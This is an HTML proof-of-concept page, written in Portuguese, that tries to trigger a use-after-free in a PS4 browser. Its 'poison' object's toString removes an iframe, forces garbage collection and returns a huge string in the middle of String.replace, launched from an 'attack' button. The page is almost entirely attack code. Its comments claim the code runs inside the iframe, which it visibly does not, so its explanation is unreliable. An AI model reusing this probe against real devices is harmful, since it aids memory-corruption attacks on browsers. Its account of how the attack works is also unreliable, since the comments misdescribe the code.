
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 PoC: String Replace UAF (Isolado)</title>
<style>
    body { background: #222; color: #fff; font-family: monospace; padding: 20px; }
    button { padding: 15px; background: #d00; color: #fff; border: 2px solid #fff; font-size: 20px; cursor: pointer; }
    #log { border: 1px solid #0f0; background: #000; padding: 10px; height: 300px; margin-top: 20px; white-space: pre-wrap;}
</style>
</head>
<body>

<h1>TESTE J02 ISOLADO: STRING REPLACE DETACH</h1>
<p>Este teste roda o ataque dentro de uma caixa de areia. Se a tela piscar ou fechar, é Crash. Se aparecer "Sobreviveu", o browser protegeu a memória.</p>

<button onclick="runAttack()">LANCAR ATAQUE</button>

<div id="log">Pronto...</div>

<script>
    const L = document.getElementById('log');
    function log(m) { L.innerHTML += "[*] " + m + "\n"; }

    function pressure() {
        const trash = [];
        try {
            for(let i=0; i<1000; i++) trash.push(new ArrayBuffer(1024 * 64));
        } catch(e){}
        trash.length = 0;
    }

    function runAttack() {
        L.innerHTML = "";
        log("1. Criando Iframe de Sacrifício...");
        
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        // Vamos rodar o código perigoso DENTRO do iframe
        // Assim, se destruirmos o documento, destruímos apenas o iframe, não o Logger principal.
        
        try {
            const win = ifr.contentWindow;
            
            log("2. Criando Objeto Venenoso...");
            const poison = {
                toString: function() {
                    log("3. GATILHO: toString() chamado pelo motor C++.");
                    log("   -> Removendo Iframe da memória (Free)...");
                    
                    // Remove o iframe do DOM principal
                    ifr.remove();
                    
                    // Força GC para limpar a memória do iframe
                    pressure();
                    
                    log("   -> Tentando corromper o retorno...");
                    // Retorna uma string gigante para forçar escrita na memória
                    return "A".repeat(1024 * 1024); 
                }
            };

            log("4. Executando String.replace...");
            // O motor vai tentar substituir "X" pelo resultado de poison.toString()
            // Mas durante o toString, o contexto de execução (iframe) morre.
            "AAA".replace("A", poison);
            
            // Se chegar aqui, não crashou imediatamente
            setTimeout(() => {
                log("RESULTADO: O navegador sobreviveu. (Safe)");
            }, 500);

        } catch(e) {
            log("RESULTADO: Erro capturado pelo JS (Safe): " + e.message);
        }
    }
</script>
</body>
</html>
